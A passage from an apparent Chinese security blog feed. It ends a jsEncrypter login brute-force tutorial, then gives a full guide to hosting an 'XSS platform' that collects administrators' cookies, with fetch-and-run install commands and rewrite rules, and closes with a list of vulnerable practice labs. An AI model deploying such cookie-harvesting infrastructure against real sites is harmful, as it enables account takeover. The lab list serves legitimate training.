js_encrypt(payload)&#123;</span><br><span class="line"> var newpayload;</span><br><span class="line"> /**********在这里编写调用加密函数进行加密的代码************/</span><br><span class="line">  /**********************************************************/</span><br><span class="line"> return newpayload;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>项目jsEncrypter/server/TestScript目录下是编写好的对应靶机各个加密算法的phantomJS脚本，可以参考！</p><h3 id="3-4-3-运行phantomJS并测试"><a href="#3-4-3-运行phantomJS并测试" class="headerlink" title="3.4.3 运行phantomJS并测试"></a>3.4.3 运行phantomJS并测试</h3><p>运行phantomJS</p><p>测试的目的是为了确保我们编写的phantomJS脚本能够正常加密payload。</p><p><img alt data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/test.gif" class="lozad"></p><h3 id="抓包暴力破解"><a href="#抓包暴力破解" class="headerlink" title="抓包暴力破解"></a>抓包暴力破解</h3><p><img alt="img" data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/crack.gif" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.uedbox.com/post/59166/" target="_blank" rel="noopener">https://www.uedbox.com/post/59166/</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS平台的搭建</title>
    <link href="https://www.mad-coding.cn/2019/09/29/XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://www.mad-coding.cn/2019/09/29/XSS平台的搭建/</id>
    <published>2019-09-28T16:12:53.000Z</published>
    <updated>2019-09-28T17:32:23.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。</p><a id="more"></a><h1 id="0x01-环境需求"><a href="#0x01-环境需求" class="headerlink" title="0x01 环境需求"></a>0x01 环境需求</h1><blockquote><p>vps：1G 512M即可 <a href="[https://billing.virmach.com](https://billing.virmach.com/)">传送门</a></p><p>域名：<a href="https://dnspod.cloud.tencent.com/" target="_blank" rel="noopener">腾讯云</a>  <a href="https://wanwang.aliyun.com/" target="_blank" rel="noopener">阿里云</a></p><p>宝塔面板</p><p>PHP 7版本</p><p>XSS平台源码 </p></blockquote><h1 id="0x02-vps购买"><a href="#0x02-vps购买" class="headerlink" title="0x02 vps购买"></a>0x02 vps购买</h1><p>可参考<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/#0x01-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/#0x01-环境准备)">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x03-域名购买"><a href="#0x03-域名购买" class="headerlink" title="0x03 域名购买"></a>0x03 域名购买</h1><p>可参考[<a href="https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x04-宝塔面板的安装"><a href="#0x04-宝塔面板的安装" class="headerlink" title="0x04 宝塔面板的安装"></a>0x04 宝塔面板的安装</h1><p>大家根据自己的vps系统选择对应的安装脚本命令，一件之行安装，非常方便</p><p><strong>entos**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p><strong>Ubuntu/Deepin**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Debian**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Fedora**</strong>安装命令<strong>**:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><h2 id="LNMP环境的安装"><a href="#LNMP环境的安装" class="headerlink" title="LNMP环境的安装"></a>LNMP环境的安装</h2><p>输入你的vps IP:8888宝塔面板后台，然后会弹出让你选择安装LAMP环境还是LNMP环境，我使用的是LNMP环境，记住PHP版本需要使用7版本以上。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929003418.png" class="lozad"></p><h1 id="0x05-开始搭建"><a href="#0x05-开始搭建" class="headerlink" title="0x05 开始搭建"></a>0x05 开始搭建</h1><h2 id="5-1-新建站点"><a href="#5-1-新建站点" class="headerlink" title="5.1 新建站点"></a>5.1 新建站点</h2><p>首先需要在宝塔面板中新建一个站点叫<code>xss.你的域名.com</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929003833.png" class="lozad"></p><p>需要从GitHub中下载xss平台的源码<a href="https://github.com/78778443/xssplatform" target="_blank" rel="noopener">传送门</a>，下载好源码后，上传到<code>xss.你的域名.com</code>站点下，记住，需要将压缩包的内容解压到站点根目录下。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004025.png" class="lozad"></p><h2 id="2-2设置伪静态"><a href="#2-2设置伪静态" class="headerlink" title="2.2设置伪静态"></a>2.2设置伪静态</h2><p>在网站-&gt;设置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004153.png" class="lozad"></p><p>在伪静态中添加相关带代码</p><p>【apache方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase /</span><br><span class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L]</span><br><span class="line">RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$  /index.php?do=do&amp;auth=$1&amp;domain=$3 [L]</span><br><span class="line">RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L]</span><br><span class="line">RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>【nginx方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)&quot; /index.php?do=code&amp;urlKey=1 last;</span><br><span class="line">rewrite &quot;^/do/auth/(\w+?)(/domain/([\w.]+?))?&quot; /index.php?do=do&amp;auth=1&amp;domain=3 last;</span><br><span class="line">rewrite &quot;^/register/(.*?)&quot; /index.php?do=register&amp;key=1 last;</span><br><span class="line">rewrite &quot;^/register-validate/(.*?)&quot; /index.php?do=register&amp;act=validate&amp;key=$1 last;</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929004245.png" class="lozad"></p><h2 id="2-2-设置域名解析"><a href="#2-2-设置域名解析" class="headerlink" title="2.2 设置域名解析"></a>2.2 设置域名解析</h2><p>添加域名解析，子域名设置为xss，记录为A ，记录值为VPS ip地址。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005237.png" class="lozad"></p><h2 id="2-4-设置数据库"><a href="#2-4-设置数据库" class="headerlink" title="2.4 设置数据库"></a>2.4 设置数据库</h2><p>宝塔面板中 ，数据库-&gt;添加数据库</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005501.png" class="lozad"></p><h2 id="2-5-开始安装"><a href="#2-5-开始安装" class="headerlink" title="2.5 开始安装"></a>2.5 开始安装</h2><p>输入域名开始安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005533.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929005739.png" class="lozad"></p><p>然后点击下一步出现数据库导入成功就说明安装好了。</p><h1 id="0x06-使用"><a href="#0x06-使用" class="headerlink" title="0x06 使用"></a>0x06 使用</h1><p>输入域名访问</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929010153.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929010238.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;​    XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透测试实战靶场</title>
    <link href="https://www.mad-coding.cn/2019/09/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
    <id>https://www.mad-coding.cn/2019/09/26/渗透测试实战靶场/</id>
    <published>2019-09-26T01:00:46.000Z</published>
    <updated>2019-09-26T01:19:58.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。</p><a id="more"></a><h1 id="0x01-Vulnerable-Web-Applications"><a href="#0x01-Vulnerable-Web-Applications" class="headerlink" title="0x01 Vulnerable Web Applications"></a>0x01 <strong>Vulnerable Web Applications</strong></h1><table><thead><tr><th>BadStore</th><th><a href="http://www.badstore.net/" target="_blank" rel="noopener">http://www.badstore.net/</a></th></tr></thead><tbody><tr><td>BodgeIt Store</td><td><a href="http://code.google.com/p/bodgeit/" target="_blank" rel="noopener">http://code.google.com/p/bodgeit/</a></td></tr><tr><td>Butterfly Security Project</td><td><a href="http://thebutterflytmp.sourceforge.net/" target="_blank" rel="noopener">http://thebutterflytmp.sourceforge.net/</a></td></tr><tr><td>bWAPP</td><td><a href="http://www.mmeit.be/bwapp/" target="_blank" rel="noopener">http://www.mmeit.be/bwapp/</a>  <a href="http://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">http://sourceforge.net/projects/bwapp/files/bee-box/</a></td></tr><tr><td>Commix</td><td><a href="https://github.com/stasinopoulos/commix-testbed" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix-testbed</a></td></tr><tr><td>CryptOMG</td><td><a href="https://github.com/SpiderLabs/CryptOMG" target="_blank" rel="noopener">https://github.com/SpiderLabs/CryptOMG</a></td></tr><tr><td>Damn Vulnerable Node Application (DVNA)</td><td><a href="https://github.com/quantumfoam/DVNA/" target="_blank" rel="noopener">https://github.com/quantumfoam/DVNA/</a></td></tr><tr><td>Damn Vulnerable Web App (DVWA)</td><td><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></td></tr><tr><td>Damn Vulnerable Web Services (DVWS)</td><td><a href="http://dvws.professionallyevil.com/" target="_blank" rel="noopener">http://dvws.professionallyevil.com/</a></td></tr><tr><td>Drunk Admin Web Hacking Challenge</td><td><a href="https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/" target="_blank" rel="noopener">https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/</a></td></tr><tr><td>Exploit KB Vulnerable Web App</td><td><a href="http://exploit.co.il/projects/vuln-web-app/" target="_blank" rel="noopener">http://exploit.co.il/projects/vuln-web-app/</a></td></tr><tr><td>Foundstone Hackme Bank</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx</a></td></tr><tr><td>Foundstone Hackme Books</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx</a></td></tr><tr><td>Foundstone Hackme Casino</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx</a></td></tr><tr><td>Foundstone Hackme Shipping</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx</a></td></tr><tr><td>Foundstone Hackme Travel</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx</a></td></tr><tr><td>GameOver</td><td><a href="http://sourceforge.net/projects/null-gameover/" target="_blank" rel="noopener">http://sourceforge.net/projects/null-gameover/</a></td></tr><tr><td>hackxor</td><td><a href="http://hackxor.sourceforge.net/cgi-bin/index.pl" target="_blank" rel="noopener">http://hackxor.sourceforge.net/cgi-bin/index.pl</a></td></tr><tr><td>Hackazon</td><td><a href="https://github.com/rapid7/hackazon" target="_blank" rel="noopener">https://github.com/rapid7/hackazon</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Moth</td><td><a href="http://www.bonsai-sec.com/en/research/moth.php" target="_blank" rel="noopener">http://www.bonsai-sec.com/en/research/moth.php</a></td></tr><tr><td>NOWASP / Mutillidae 2</td><td><a href="http://sourceforge.net/projects/mutillidae/" target="_blank" rel="noopener">http://sourceforge.net/projects/mutillidae/</a></td></tr><tr><td>OWASP BWA</td><td><a href="http://code.google.com/p/owaspbwa/" target="_blank" rel="noopener">http://code.google.com/p/owaspbwa/</a></td></tr><tr><td>OWASP Hackademic</td><td><a href="http://hackademic1.teilar.gr/" target="_blank" rel="noopener">http://hackademic1.teilar.gr/</a></td></tr><tr><td>OWASP SiteGenerator</td><td><a href="https://www.owasp.org/index.php/Owasp_SiteGenerator" target="_blank" rel="noopener">https://www.owasp.org/index.php/Owasp_SiteGenerator</a></td></tr><tr><td>OWASP Bricks</td><td><a href="http://sourceforge.net/projects/owaspbricks/" target="_blank" rel="noopener">http://sourceforge.net/projects/owaspbricks/</a></td></tr><tr><td>OWASP Security Shepherd</td><td><a href="https://www.owasp.org/index.php/OWASP_Security_Shepherd" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Security_Shepherd</a></td></tr><tr><td>PentesterLab</td><td><a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></td></tr><tr><td>PHDays iBank CTF</td><td><a href="http://blog.phdays.com/2012/05/once-again-about-remote-banking.html" target="_blank" rel="noopener">http://blog.phdays.com/2012/05/once-again-about-remote-banking.html</a></td></tr><tr><td>SecuriBench</td><td><a href="http://suif.stanford.edu/~livshits/securibench/" target="_blank" rel="noopener">http://suif.stanford.edu/~livshits/securibench/</a></td></tr><tr><td>SentinelTestbed</td><td><a href="https://github.com/dobin/SentinelTestbed" target="_blank" rel="noopener">https://github.com/dobin/SentinelTestbed</a></td></tr><tr><td>SocketToMe</td><td><a href="http://digi.ninja/projects/sockettome.php" target="_blank" rel="noopener">http://digi.ninja/projects/sockettome.php</a></td></tr><tr><td>sqli-labs</td><td><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></td></tr><tr><td>MCIR (Magical Code Injection Rainbow)</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>sqlilabs</td><td><a href="https://github.com/himadriganguly/sqlilabs" target="_blank" rel="noopener">https://github.com/himadriganguly/sqlilabs</a></td></tr><tr><td>VulnApp</td><td><a href="http://www.nth-dimension.org.uk/blog.php?id=88" target="_blank" rel="noopener">http://www.nth-dimension.org.uk/blog.php?id=88</a></td></tr><tr><td>PuzzleMall</td><td><a href="http://code.google.com/p/puzzlemall/" target="_blank" rel="noopener">http://code.google.com/p/puzzlemall/</a></td></tr><tr><td>WackoPicko</td><td><a href="https://github.com/adamdoupe/WackoPicko" target="_blank" rel="noopener">https://github.com/adamdoupe/WackoPicko</a></td></tr><tr><td>WAED</td><td><a href="http://www.waed.info/" target="_blank" rel="noopener">http://www.waed.info</a></td></tr><tr><td>WebGoat.NET</td><td><a href="https://github.com/jerryhoff/WebGoat.NET" target="_blank" rel="noopener">https://github.com/jerryhoff/WebGoat.NET/</a></td></tr><tr><td>WebSecurity Dojo</td><td><a href="http://www.mavensecurity.com/web_security_dojo/" target="_blank" rel="noopener">http://www.mavensecurity.com/web_security_dojo/</a></td></tr><tr><td>XVWA</td><td><a href="https://github.com/s4n7h0/xvwa" target="_blank" rel="noopener">https://github.com/s4n7h0/xvwa</a></td></tr><tr><td>Zap WAVE</td><td><a href="http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip" target="_blank" rel="noopener">http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip</a></td></tr></tbody></table><h1 id="0x02-Vulnerable-Operating-System-Installations"><a href="#0x02-Vulnerable-Operating-System-Installations" class="headerlink" title="0x02 Vulnerable Operating System Installations"></a>0x02 <strong>Vulnerable Operating System Installations</strong></h1><table><thead><tr><th>21LTR</th><th><a href="http://21ltr.com/scenes/" target="_blank" rel="noopener">http://21ltr.com/scenes/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable Linux</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/dvl/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/dvl/</a></td></tr><tr><td>exploit-exercises - nebula, protostar, fusion</td><td><a href="http://exploit-exercises.com/download" target="_blank" rel="noopener">http://exploit-exercises.com/download</a></td></tr><tr><td>heorot: DE-ICE, hackerdemia</td><td><a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso" target="_blank" rel="noopener">hackerdemia - http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso</a></td></tr><tr><td>Holynix</td><td><a href="http://sourceforge.net/projects/holynix/files/" target="_blank" rel="noopener">http://sourceforge.net/projects/holynix/files/</a></td></tr><tr><td>Kioptrix</td><td><a href="http://www.kioptrix.com/blog/" target="_blank" rel="noopener">http://www.kioptrix.com/blog/</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Metasploitable</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/</a></td></tr><tr><td>neutronstar</td><td><a href="http://neutronstar.org/goatselinux.html" target="_blank" rel="noopener">http://neutronstar.org/goatselinux.html</a></td></tr><tr><td>PenTest Laboratory</td><td><a href="http://pentestlab.org/lab-in-a-box/" target="_blank" rel="noopener">http://pentestlab.org/lab-in-a-box/</a></td></tr><tr><td>Pentester Lab</td><td><a href="https://www.pentesterlab.com/exercises" target="_blank" rel="noopener">https://www.pentesterlab.com/exercises</a></td></tr><tr><td>pWnOS</td><td><a href="http://www.pwnos.com/" target="_blank" rel="noopener">http://www.pwnos.com/</a></td></tr><tr><td>RebootUser Vulnix</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>SecGame # 1: Sauron</td><td><a href="http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html" target="_blank" rel="noopener">http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html</a></td></tr><tr><td>scriptjunkie.us</td><td><a href="http://www.scriptjunkie.us/2012/04/the-hacker-games/" target="_blank" rel="noopener">http://www.scriptjunkie.us/2012/04/the-hacker-games/</a></td></tr><tr><td>UltimateLAMP</td><td><a href="http://www.amanhardikar.com/mindmaps/practice-links.html" target="_blank" rel="noopener">http://www.amanhardikar.com/mindmaps/practice-links.html</a></td></tr><tr><td>TurnKey Linux</td><td><a href="http://www.turnkeylinux.org/" target="_blank" rel="noopener">http://www.turnkeylinux.org/</a></td></tr><tr><td>Bitnami</td><td><a href="https://bitnami.com/stacks" target="_blank" rel="noopener">https://bitnami.com/stacks</a></td></tr><tr><td>Elastic Server</td><td><a href="http://elasticserver.com/" target="_blank" rel="noopener">http://elasticserver.com</a></td></tr><tr><td>OS Boxes</td><td><a href="http://www.osboxes.org/" target="_blank" rel="noopener">http://www.osboxes.org</a></td></tr><tr><td>VirtualBoxes</td><td><a href="http://virtualboxes.org/images/" target="_blank" rel="noopener">http://virtualboxes.org/images/</a></td></tr><tr><td>VirtualBox Virtual Appliances</td><td><a href="https://virtualboximages.com/" target="_blank" rel="noopener">https://virtualboximages.com/</a></td></tr><tr><td>CentOS</td><td><a href="http://www.centos.org/" target="_blank" rel="noopener">http://www.centos.org/</a></td></tr><tr><td>Default Windows Clients</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise</a>  <a href="https://dev.windows.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://dev.windows.com/en-us/microsoft-edge/tools/vms/</a></td></tr><tr><td>Default Windows Server</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview</a></td></tr><tr><td>Default VMWare vSphere</td><td><a href="http://www.vmware.com/products/vsphere/" target="_blank" rel="noopener">http://www.vmware.com/products/vsphere/</a></td></tr></tbody></table><h1 id="0x03-Sites-for-Downloading-Older-Versions-of-Various-Software"><a href="#0x03-Sites-for-Downloading-Older-Versions-of-Various-Software" class="headerlink" title="0x03 Sites for Downloading Older Versions of Various Software"></a>0x03 <strong>Sites for Downloading Older Versions of Various Software</strong></h1><table><thead><tr><th>Exploit-DB</th><th><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com/</a></th></tr></thead><tbody><tr><td>Old Apps</td><td><a href="http://www.oldapps.com/" target="_blank" rel="noopener">http://www.oldapps.com/</a></td></tr><tr><td>Old Version</td><td><a href="http://www.oldversion.com/" target="_blank" rel="noopener">http://www.oldversion.com/</a></td></tr><tr><td>VirtualHacking Repo</td><td><a href="https://www.amanhardikar.com/mindmaps/sourceforge.net/projects/virtualhacking/files/apps%40realworld/" target="_blank" rel="noopener">sourceforge.net/projects/virtualhacking/files/apps%40realworld/</a></td></tr></tbody></table><h1 id="0x04-Sites-by-Vendors-of-Security-Testing-Software"><a href="#0x04-Sites-by-Vendors-of-Security-Testing-Software" class="headerlink" title="0x04 Sites by Vendors of Security Testing Software"></a>0x04 <strong>Sites by Vendors of Security Testing Software</strong></h1><table><thead><tr><th>Acunetix acuforum</th><th><a href="http://testasp.vulnweb.com/" target="_blank" rel="noopener">http://testasp.vulnweb.com/</a></th></tr></thead><tbody><tr><td>Acunetix acublog</td><td><a href="http://testaspnet.vulnweb.com/" target="_blank" rel="noopener">http://testaspnet.vulnweb.com/</a></td></tr><tr><td>Acunetix acuart</td><td><a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></td></tr><tr><td>Cenzic crackmebank</td><td><a href="http://crackme.cenzic.com/" target="_blank" rel="noopener">http://crackme.cenzic.com</a></td></tr><tr><td>HP freebank</td><td><a href="http://zero.webappsecurity.com/" target="_blank" rel="noopener">http://zero.webappsecurity.com</a></td></tr><tr><td>IBM altoromutual</td><td><a href="http://demo.testfire.net/" target="_blank" rel="noopener">http://demo.testfire.net/</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://aspnet.testsparker.com/" target="_blank" rel="noopener">http://aspnet.testsparker.com</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://php.testsparker.com/" target="_blank" rel="noopener">http://php.testsparker.com</a></td></tr><tr><td>NTOSpider Test Site</td><td><a href="http://www.webscantest.com/" target="_blank" rel="noopener">http://www.webscantest.com/</a></td></tr></tbody></table><h1 id="0x05-Sites-for-Improving-Your-Hacking-Skills"><a href="#0x05-Sites-for-Improving-Your-Hacking-Skills" class="headerlink" title="0x05 Sites for Improving Your Hacking Skills"></a>0x05 <strong>Sites for Improving Your Hacking Skills</strong></h1><table><thead><tr><th>Embedded Security CTF</th><th><a href="https://microcorruption.com/" target="_blank" rel="noopener">https://microcorruption.com</a></th></tr></thead><tbody><tr><td>EnigmaGroup</td><td><a href="http://www.enigmagroup.org/" target="_blank" rel="noopener">http://www.enigmagroup.org/</a></td></tr><tr><td>Escape</td><td><a href="http://escape.alf.nu/" target="_blank" rel="noopener">http://escape.alf.nu/</a></td></tr><tr><td>Google Gruyere</td><td><a href="http://google-gruyere.appspot.com/" target="_blank" rel="noopener">http://google-gruyere.appspot.com/</a></td></tr><tr><td>Gh0st Lab</td><td><a href="http://www.gh0st.net/" target="_blank" rel="noopener">http://www.gh0st.net/</a></td></tr><tr><td>Hack This Site</td><td><a href="http://www.hackthissite.org/" target="_blank" rel="noopener">http://www.hackthissite.org/</a></td></tr><tr><td>HackThis</td><td><a href="http://www.hackthis.co.uk/" target="_blank" rel="noopener">http://www.hackthis.co.uk/</a></td></tr><tr><td>HackQuest</td><td><a href="http://www.hackquest.com/" target="_blank" rel="noopener">http://www.hackquest.com/</a></td></tr><tr><td>Hack.me</td><td><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me</a></td></tr><tr><td>Hacking-Lab</td><td><a href="https://www.hacking-lab.com/" target="_blank" rel="noopener">https://www.hacking-lab.com</a></td></tr><tr><td>Hacker Challenge</td><td><a href="http://www.dareyourmind.net/" target="_blank" rel="noopener">http://www.dareyourmind.net/</a></td></tr><tr><td>Hacker Test</td><td><a href="http://www.hackertest.net/" target="_blank" rel="noopener">http://www.hackertest.net/</a></td></tr><tr><td>hACME Game</td><td><a href="http://www.hacmegame.org/" target="_blank" rel="noopener">http://www.hacmegame.org/</a></td></tr><tr><td>Halls Of Valhalla</td><td><a href="http://halls-of-valhalla.org/beta/challenges" target="_blank" rel="noopener">http://halls-of-valhalla.org/beta/challenges</a></td></tr><tr><td>Hax.Tor</td><td><a href="http://hax.tor.hu/" target="_blank" rel="noopener">http://hax.tor.hu/</a></td></tr><tr><td>OverTheWire</td><td><a href="http://www.overthewire.org/wargames/" target="_blank" rel="noopener">http://www.overthewire.org/wargames/</a></td></tr><tr><td>PentestIT</td><td><a href="http://www.pentestit.ru/en/" target="_blank" rel="noopener">http://www.pentestit.ru/en/</a></td></tr><tr><td>CSC Play on Demand</td><td><a 